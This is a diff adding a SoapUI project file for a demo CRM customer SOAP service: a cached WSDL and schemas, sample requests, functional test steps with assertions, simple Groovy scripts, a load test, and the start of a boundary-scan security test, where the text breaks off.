@@ -1,0 +1,439 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<con:soapui-project id="e944223c-bed8-4a58-a831-6e9d5e6c30c7" activeEnvironment="Default environment" name="March-CustomerService" resourceRoot="" soapui-version="6.0.0" abortOnError="false" runType="SEQUENTIAL" xmlns:con="http://eviware.com/soapui/config"><con:settings/><con:interface xsi:type="con:WsdlInterface" id="303953f0-a0d8-47c3-abad-ca55a2175cc7" wsaVersion="NONE" name="CRMServicePTBinding" type="wsdl" bindingName="{http://predic8.com/wsdl/crm/CRMService/1/}CRMServicePTBinding" soapVersion="1_1" anonymous="optional" definition="http://www.predic8.com:8080/crm/CustomerService?wsdl" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://www.predic8.com:8080/crm/CustomerService?wsdl"><con:part><con:url>http://www.predic8.com:8080/crm/CustomerService?wsdl</con:url><con:content><![CDATA[<!--Published by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.2.1-b01-.-->
+<wsdl:definitions targetNamespace="http://predic8.com/wsdl/crm/CRMService/1/" name="crm" xmlns="http://schemas.xmlsoap.org/wsdl/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://predic8.com/wsdl/crm/CRMService/1/" xmlns:ns="http://predic8.com/material/1/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:ns1="http://predic8.com/material/1/" xmlns:ns2="http://predic8.com/common/1/">
+  <types>
+    <xsd:schema targetNamespace="http://predic8.com/wsdl/crm/CRMService/1/" xmlns:crm="http://predic8.com/crm/1/">
+      <xsd:import schemaLocation="http://www.predic8.com:8080/crm/CustomerService?xsd=2" namespace="http://predic8.com/crm/1/"/>
+      <xsd:import schemaLocation="http://www.predic8.com:8080/crm/CustomerService?xsd=1" namespace="http://predic8.com/common/1/"/>
+      <xsd:element name="createResponse">
+        <xsd:complexType>
+          <xsd:sequence/>
+        </xsd:complexType>
+      </xsd:element>
+      <xsd:element name="create" type="tns:CreateType"/>
+      <xsd:complexType name="CreateType">
+        <xsd:sequence>
+          <xsd:element name="customer" type="crm:CustomerType"/>
+        </xsd:sequence>
+      </xsd:complexType>
+      <xsd:element name="get" type="tns:GetType"/>
+      <xsd:complexType name="GetType">
+        <xsd:sequence>
+          <xsd:element name="id" type="ns2:IdentifierType"/>
+        </xsd:sequence>
+      </xsd:complexType>
+      <xsd:element name="getResponse" type="tns:GetResponseType"/>
+      <xsd:complexType name="GetResponseType">
+        <xsd:sequence>
+          <xsd:element name="customer" type="crm:CustomerType"/>
+        </xsd:sequence>
+      </xsd:complexType>
+      <xsd:element name="getAll" type="tns:GetAllType"/>
+      <xsd:complexType name="GetAllType">
+        <xsd:sequence></xsd:sequence>
+      </xsd:complexType>
+      <xsd:element name="getAllResponse" type="tns:GetAllResponseType"/>
+      <xsd:complexType name="GetAllResponseType">
+        <xsd:sequence>
+          <xsd:element minOccurs="0" name="customer" maxOccurs="unbounded" type="crm:CustomerType"/>
+        </xsd:sequence>
+      </xsd:complexType>
+    </xsd:schema>
+  </types>
+  <message name="createRequest">
+    <part name="parameters" element="tns:create"/>
+  </message>
+  <message name="createResponse">
+    <part name="parameters" element="tns:createResponse"/>
+  </message>
+  <message name="getRequest">
+    <part name="parameters" element="tns:get"/>
+  </message>
+  <message name="getResponse">
+    <part name="parameters" element="tns:getResponse"/>
+  </message>
+  <message name="getAllRequest">
+    <part name="parameters" element="tns:getAll"/>
+  </message>
+  <message name="getAllResponse">
+    <part name="parameters" element="tns:getAllResponse"/>
+  </message>
+  <portType name="CRMServicePT">
+    <operation name="create">
+      <input name="input1" message="tns:createRequest"/>
+      <output name="output1" message="tns:createResponse"/>
+    </operation>
+    <operation name="get">
+      <input name="input2" message="tns:getRequest"/>
+      <output name="output2" message="tns:getResponse"/>
+    </operation>
+    <operation name="getAll">
+      <input name="input3" message="tns:getAllRequest"/>
+      <output name="output3" message="tns:getAllResponse"/>
+    </operation>
+  </portType>
+  <wsdl:binding name="CRMServicePTBinding" type="tns:CRMServicePT">
+    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
+    <wsdl:operation name="create">
+      <soap:operation soapAction="create_action"/>
+      <wsdl:input name="input1">
+        <soap:body use="literal"/>
+      </wsdl:input>
+      <wsdl:output name="output1">
+        <soap:body use="literal"/>
+      </wsdl:output>
+    </wsdl:operation>
+    <wsdl:operation name="get">
+      <soap:operation soapAction="get_action"/>
+      <wsdl:input name="input2">
+        <soap:body use="literal"/>
+      </wsdl:input>
+      <wsdl:output name="output2">
+        <soap:body use="literal"/>
+      </wsdl:output>
+    </wsdl:operation>
+    <wsdl:operation name="getAll">
+      <soap:operation soapAction="getAll_action"/>
+      <wsdl:input name="input3">
+        <soap:body use="literal"/>
+      </wsdl:input>
+      <wsdl:output name="output3">
+        <soap:body use="literal"/>
+      </wsdl:output>
+    </wsdl:operation>
+  </wsdl:binding>
+  <wsdl:service name="CustomerService">
+    <wsdl:port name="CRMServicePTPort" binding="tns:CRMServicePTBinding">
+      <soap:address location="http://www.predic8.com:8080/crm/CustomerService"/>
+    </wsdl:port>
+  </wsdl:service>
+</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part><con:part><con:url>http://www.predic8.com:8080/crm/CustomerService?xsd=2</con:url><con:content><![CDATA[<!--Published by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.2.1-b01-.-->
+<xsd:schema targetNamespace="http://predic8.com/crm/1/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://predic8.com/crm/1/" xmlns:co="http://predic8.com/common/1/">
+  <xsd:import schemaLocation="http://www.predic8.com:8080/crm/CustomerService?xsd=1" namespace="http://predic8.com/common/1/"/>
+  <xsd:complexType name="CompanyAddressType">
+    <xsd:complexContent>
+      <xsd:extension base="co:AddressType">
+        <xsd:sequence>
+          <xsd:element name="companyName" type="xsd:string"/>
+        </xsd:sequence>
+      </xsd:extension>
+    </xsd:complexContent>
+  </xsd:complexType>
+  <xsd:complexType name="CustomerType">
+    <xsd:sequence>
+      <xsd:element name="person" type="co:PersonType"/>
+      <xsd:element name="address" type="tns:CompanyAddressType"/>
+      <xsd:element name="id" type="co:IdentifierType"/>
+    </xsd:sequence>
+  </xsd:complexType>
+</xsd:schema>]]></con:content><con:type>http://www.w3.org/2001/XMLSchema</con:type></con:part><con:part><con:url>http://www.predic8.com:8080/crm/CustomerService?xsd=1</con:url><con:content><![CDATA[<!--Published by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.2.1-b01-.-->
+<xsd:schema targetNamespace="http://predic8.com/common/1/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://predic8.com/common/1/">
+  <xsd:annotation>
+    <xsd:documentation>Common datatypes that are used in different systems.</xsd:documentation>
+  </xsd:annotation>
+  <xsd:include schemaLocation="http://www.predic8.com:8080/crm/CustomerService?xsd=3"/>
+  <xsd:simpleType name="IdentifierType">
+    <xsd:annotation>
+      <xsd:documentation>Identifier for business objects.</xsd:documentation>
+    </xsd:annotation>
+    <xsd:restriction base="xsd:string">
+      <xsd:pattern value="[A-Z]{2}-\d{5}"/>
+    </xsd:restriction>
+  </xsd:simpleType>
+  <xsd:complexType name="PersonType">
+    <xsd:sequence>
+      <xsd:element name="id" type="tns:IdentifierType"/>
+      <xsd:element name="firstName" type="xsd:string"/>
+      <xsd:element name="lastName" type="xsd:string"/>
+      <xsd:element minOccurs="0" name="address" type="tns:AddressType"/>
+      <xsd:element name="age" type="xsd:integer"/>
+    </xsd:sequence>
+  </xsd:complexType>
+  <xsd:complexType name="AddressType">
+    <xsd:sequence>
+      <xsd:element name="street" type="xsd:string"/>
+      <xsd:element name="city" type="xsd:string"/>
+      <xsd:element name="zipCode" type="xsd:string"/>
+      <xsd:element name="country" type="xsd:string"/>
+    </xsd:sequence>
+  </xsd:complexType>
+</xsd:schema>]]></con:content><con:type>http://www.w3.org/2001/XMLSchema</con:type></con:part><con:part><con:url>http://www.predic8.com:8080/crm/CustomerService?xsd=3</con:url><con:content><![CDATA[<!--Published by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.2.1-b01-.-->
+<xsd:schema targetNamespace="http://predic8.com/common/1/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://predic8.com/common/1/">
+  <xsd:complexType name="MoneyType">
+    <xsd:sequence>
+      <xsd:element name="amount" type="xsd:decimal"/>
+      <xsd:element name="currency" type="tns:CurrencyType"/>
+    </xsd:sequence>
+  </xsd:complexType>
+  <xsd:simpleType name="CurrencyType">
+    <xsd:restriction base="xsd:string">
+      <xsd:enumeration value="EUR"/>
+      <xsd:enumeration value="USD"/>
+    </xsd:restriction>
+  </xsd:simpleType>
+</xsd:schema>]]></con:content><con:type>http://www.w3.org/2001/XMLSchema</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://DESKTOP-ID9MJDP:8088/mockCRMServicePTBinding</con:endpoint><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint></con:endpoints><con:operation id="b0e3e400-d629-4668-bd26-653447166e27" isOneWay="false" action="create_action" name="create" bindingOperationName="create" type="Request-Response" outputName="output1" inputName="input1" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="54187449-5b28-4a59-8bb5-cf7bc8fb739b" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://DESKTOP-ID9MJDP:8088/mockCRMServicePTBinding</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">\r
+   <soapenv:Header/>\r
+   <soapenv:Body>\r
+      <ns:create>\r
+         <customer>\r
+            <person>\r
+               <id>310</id>\r
+               <firstName>Medha</firstName>\r
+               <lastName>K</lastName>\r
+               <!--Optional:-->\r
+               <address>\r
+                  <street>39420</street>\r
+                  <city>Fremont</city>\r
+                  <zipCode>94536</zipCode>\r
+                  <country>CA</country>\r
+               </address>\r
+               <age>?</age>\r
+            </person>\r
+            <address>\r
+               <street>?</street>\r
+               <city>?</city>\r
+               <zipCode>?</zipCode>\r
+               <country>?</country>\r
+               <companyName>?</companyName>\r
+            </address>\r
+            <id>310</id>\r
+         </customer>\r
+      </ns:create>\r
+   </soapenv:Body>\r
+</soapenv:Envelope>]]></con:request><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="b646e0b3-a324-4611-87ba-42222816a8e8" isOneWay="false" action="get_action" name="get" bindingOperationName="get" type="Request-Response" outputName="output2" inputName="input2" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="85fc3861-3993-4a60-bb79-62952733f86e" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">\r
+   <soapenv:Header/>\r
+   <soapenv:Body>\r
+      <ns:get>\r
+         <id>413</id>\r
+      </ns:get>\r
+   </soapenv:Body>\r
+</soapenv:Envelope>]]></con:request><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="get_action"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="435fea59-541d-4b30-b65f-6193ee5e9164" isOneWay="false" action="getAll_action" name="getAll" bindingOperationName="getAll" type="Request-Response" outputName="output3" inputName="input3" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="db9db07a-8347-45fd-8cca-2956b8a59265" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">\r
+   <soapenv:Header/>\r
+   <soapenv:Body>\r
+      <ns:getAll/>\r
+   </soapenv:Body>\r
+</soapenv:Envelope>]]></con:request><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="getAll_action"/><con:wsrmConfig version="1.2"/></con:call></con:operation></con:interface><con:testSuite id="6776e3d0-0080-4b88-ad86-0649d23f2bce" name="TestSuite1"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="173dec63-1c12-47ee-8999-b08c1e6093f1" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase1" searchProperties="true"><con:settings/><con:testStep type="properties" name="Properties" id="3c116518-6df6-4b71-a752-5e740e8de56e"><con:settings/><con:config xsi:type="con:PropertiesStep" saveFirst="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:source>C:/Users/WBL/Desktop/inputData.properties</con:source><con:properties><con:property><con:name>id</con:name><con:value>413</con:value></con:property><con:property><con:name>name</con:name><con:value>Abid</con:value></con:property><con:property><con:name>City</con:name><con:value>Dublin</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="JDBC Request" id="f53ca7bd-437b-4bea-829f-dac26835901f" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:properties/></con:config></con:testStep><con:testStep type="transfer" name="PropertyTransfer" id="4af33173-ae7e-49a8-869c-668727d49ce4"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>id</con:name><con:sourceType>id</con:sourceType><con:sourceStep>Properties</con:sourceStep><con:targetType>Request</con:targetType><con:targetStep>createUser</con:targetStep><con:targetPath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:create/customer/person/id</con:targetPath><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>name</con:name><con:sourceType>name</con:sourceType><con:sourceStep>Properties</con:sourceStep><con:targetType>Request</con:targetType><con:targetStep>createUser</con:targetStep><con:targetPath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:create/customer/person/firstName</con:targetPath><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>city</con:name><con:sourceType>City</con:sourceType><con:sourceStep>Properties</con:sourceStep><con:targetType>Request</con:targetType><con:targetStep>createUser</con:targetStep><con:targetPath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:create/customer/person/address/city</con:targetPath><con:upgraded>true</con:upgraded></con:transfers><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>id2</con:name><con:sourceType>id</con:sourceType><con:sourceStep>Properties</con:sourceStep><con:targetType>Request</con:targetType><con:targetStep>createUser</con:targetStep><con:targetPath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:create/customer/id</con:targetPath><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep type="request" id="b152354f-f383-43ae-a721-e2bf3eefc0d2" name="createUser"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>create</con:operation><con:request name="createUser" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="706e558f-a5b7-4dca-9c64-a8bdec8862d1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:create>
+         <customer>
+            <person>
+            <token>${#TestCase#token}</token>
+               <id>413</id>
+               <firstName>Abid</firstName>
+               <lastName>K</lastName>
+               <!--Optional:-->
+               <address>
+                  <street>39420</street>
+                  <city>Dublin</city>
+                  <zipCode>94536</zipCode>
+                  <country>CA</country>
+               </address>
+               <age>?</age>
+            </person>
+            <address>
+               <street>?</street>
+               <city>?</city>
+               <zipCode>?</zipCode>
+               <country>?</country>
+               <companyName>?</companyName>
+            </address>
+            <id>413</id>
+         </customer>
+      </ns:create>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:request><con:assertion type="SOAP Response" id="94b911a2-c7cc-47cd-b23a-eba0607e77c6" name="SOAP Response"/><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:testStep type="transfer" name="DependencyDataTransfer" id="236698f2-c201-4930-b8e8-86e7355bd045"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>id</con:name><con:sourceType>Request</con:sourceType><con:sourceStep>createUser</con:sourceStep><con:sourcePath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:create/customer/person/id</con:sourcePath><con:targetType>Request</con:targetType><con:targetStep>getUser</con:targetStep><con:targetPath>declare namespace ns="http://predic8.com/wsdl/crm/CRMService/1/"
+//ns:get/id</con:targetPath><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep type="request" id="10220664-3bad-452c-bd0d-89743393ee75" name="getUser"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>get</con:operation><con:request name="getUser" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="04095d8f-410f-4149-8a08-01e957850fa2"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:get>
+         <id>413</id>
+      </ns:get>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:request><con:assertion type="SOAP Response" id="ff6aa08b-b4e7-4079-a9e7-9951080244d8" name="SOAP Response"/><con:assertion type="Invalid HTTP Status Codes" id="52f68196-7f2c-4920-b257-5f621aa11489" name="Invalid HTTP Status Codes"><con:configuration><codes>400,500</codes></con:configuration></con:assertion><con:assertion type="Valid HTTP Status Codes" id="a3fc03cc-f48d-46d4-a7bd-193cd18a7c95" name="Valid HTTP Status Codes"><con:settings/><con:configuration><codes>200,201</codes></con:configuration></con:assertion><con:assertion type="Schema Compliance" id="30bfe1ac-b837-4511-a41e-69e7600d5a4f" name="Schema Compliance" disabled="true"><con:configuration><definition/></con:configuration></con:assertion><con:assertion type="Simple Contains" id="717cb20b-e305-4b2c-8b5f-e5b793f6abf1" name="valuePresence"><con:configuration><token>Dublin</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="Simple NotContains" id="554d210a-fe85-4a41-8410-f9f31e4dddff" name="Not Contains"><con:configuration><token>orderid</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="Simple Contains" id="7cba6140-f4b0-4307-b16f-c4324589efe8" name="elementPresence"><con:configuration><token>firstName</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="XPath Match" id="84e7d6b0-3b97-4ae2-8d64-8840c3c1e6d0" name="XPath Match"><con:configuration><path>declare namespace ns2='http://predic8.com/wsdl/crm/CRMService/1/';
+declare namespace S='http://schemas.xmlsoap.org/soap/envelope/';
+//ns2:getResponse/customer/person/id</path><content>413</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="9c932fad-b55a-486e-aecd-23385b3232c4" name="XPathAssertion2"><con:configuration><path>declare namespace ns2='http://predic8.com/wsdl/crm/CRMService/1/';
+declare namespace S='http://schemas.xmlsoap.org/soap/envelope/';
+exists(//ns2:getResponse/customer/person)</path><content>true</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="get_action"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:testStep type="goto" name="ConditionalGoto" id="9441caf2-40e5-4308-a379-3ae35faff5a4"><con:settings/><con:config xsi:type="con:GotoStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:condition><con:name>Condition1</con:name><con:type>XPATH</con:type><con:expression>declare namespace ns2="http://predic8.com/wsdl/crm/CRMService/1/"
+exists(//ns2:orderid)
+</con:expression><con:targetStep>ManualTestStep</con:targetStep></con:condition></con:config></con:testStep><con:testStep type="manualTestStep" name="ManualTestStep" id="de13795f-6bd2-4213-9d4b-fc3ea8e70c84"><con:description>Make sure link is clicked  which is sent through email</con:description><con:settings/><con:config xsi:type="con:ManualTestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:expectedResult>successful registration</con:expectedResult></con:config></con:testStep><con:testStep type="delay" name="Delay" id="448a07e4-5610-47e8-9a3b-b5afadb917ac"><con:settings/><con:config><delay>1000</delay></con:config></con:testStep><con:testStep type="groovy" name="GroovyScript" id="cb28fec8-ebde-421f-a9cd-c4d161d24ee7"><con:settings/><con:config><script>def a=10
+
+def b=10
+
+log.info("[$a]")
+
+def c= a + b;
+log.info("sum:[$c]")
+
+if(a&lt;0){
+	log.info("num is negative");
+}else{
+	log.info("num is positive");
+}
+</script></con:config></con:testStep><con:testStep type="request" id="800005b1-d32b-412f-bf85-fc96ddbfc78b" name="getAll"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>getAll</con:operation><con:request name="getAll" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="5c1b6875-1ef6-41ee-a20d-9a18abac6fd5"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.predic8.com:8080/crm/CustomerService</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">\r
+   <soapenv:Header/>\r
+   <soapenv:Body>\r
+      <ns:getAll/>\r
+   </soapenv:Body>\r
+</soapenv:Envelope>]]></con:request><con:assertion type="SOAP Response" id="93be2336-1d4c-4796-aff7-91eeaf15a289" name="SOAP Response"/><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="getAll_action"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:testStep type="groovy" name="Groovy Script- Get Response Data" id="ed32fa77-314d-44c9-80ac-8f3032342145" disabled="true"><con:settings/><con:config><script>log.info(testSuite.name);
+
+def util = new com.eviware.soapui.support.GroovyUtils(context);
+
+def resp = util.getXmlHolder("getAll#Response");
+
+resp.namespaces["ns2"]="http://predic8.com/wsdl/crm/CRMService/1/";
+
+for(cust in resp.getNodeValues("//ns2:getAllResponse/customer/person/firstName")){
+	log.info("cust is : [$cust]");
+}
+
+testRunner.runTestStepByName("getUser");
+</script></con:config></con:testStep><con:testStep type="mockresponse" name="create" id="0eda3426-7c66-4775-b8bd-b8b89d874c33" disabled="true"><con:settings/><con:config xsi:type="con:MockResponseStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>create</con:operation><con:path>/mockCRMServicePTBinding</con:path><con:port>8088</con:port><con:response name="Response 1" id="cd162b9b-9bcf-4129-bcd6-6cf66e8004fc" httpResponseStatus="200" encoding="UTF-8"><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:createResponse/>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/></con:response></con:config></con:testStep><con:testStep type="mockresponse" name="mockcreateTestStep" id="bf95cab5-8ffe-487f-9ec3-8d643ae72ea9" disabled="true"><con:settings/><con:config xsi:type="con:MockResponseStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CRMServicePTBinding</con:interface><con:operation>create</con:operation><con:path>/</con:path><con:port>8080</con:port><con:response name="Response 1" id="2b706809-7110-41ac-815d-134d61fe9c4f" httpResponseStatus="200" encoding="UTF-8"><con:settings/><con:responseContent><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://predic8.com/wsdl/crm/CRMService/1/">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <ns:createResponse/>
+   </soapenv:Body>
+</soapenv:Envelope>]]></con:responseContent><con:wsaConfig mustUnderstand="NONE" version="200508" action="create_action"/></con:response></con:config></con:testStep><con:loadTest id="e82f3a56-6ede-4366-9894-135028871a70" name="LoadTest 1"><con:settings/><con:threadCount>100</con:threadCount><con:startDelay>0</con:startDelay><con:sampleInterval>250</con:sampleInterval><con:calculateTPSOnTimePassed>true</con:calculateTPSOnTimePassed><con:resetStatisticsOnThreadCountChange>true</con:resetStatisticsOnThreadCountChange><con:historyLimit>-1</con:historyLimit><con:testLimit>30</con:testLimit><con:limitType>TIME</con:limitType><con:loadStrategy><con:type>Variance</con:type><con:config><interval>60000</interval><variance>0.5</variance></con:config></con:loadStrategy><con:assertion type="Step Status" name="Step Status"/><con:assertion type="Max Errors" name="Max Errors"><con:configuration><name>Max Errors</name><max-absolute-errors>0</max-absolute-errors><max-relative-errors>0.0</max-relative-errors><test-step>- Any -</test-step></con:configuration></con:assertion><con:assertion type="Step Status" name="Step Status"><con:configuration><name>Step Status</name><min-requests>3</min-requests><test-step>- Any -</test-step><max-errors>2</max-errors></con:configuration></con:assertion><con:maxAssertionErrors>100</con:maxAssertionErrors><con:cancelExcessiveThreads>true</con:cancelExcessiveThreads><con:strategyInterval>500</con:strategyInterval><con:reportParameters/></con:loadTest><con:properties><con:property><con:name>env</con:name><con:value>qa</con:value></con:property><con:property><con:name>token</con:name><con:value>8721632783721989</con:value></con:property></con:properties><con:reportParameters/><con:securityTest id="154b54b9-2d27-4bf2-8da2-5ec27cdac302" name="SecurityTest 1" failOnError="true" testCaseId="173dec63-1c12-47ee-8999-b08c1e6093f1"><con:settings/><con:testStepSecurityTest><con:testStepId>b152354f-f383-43ae-a721-e2bf3eefc0d2</con:testStepId><con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" 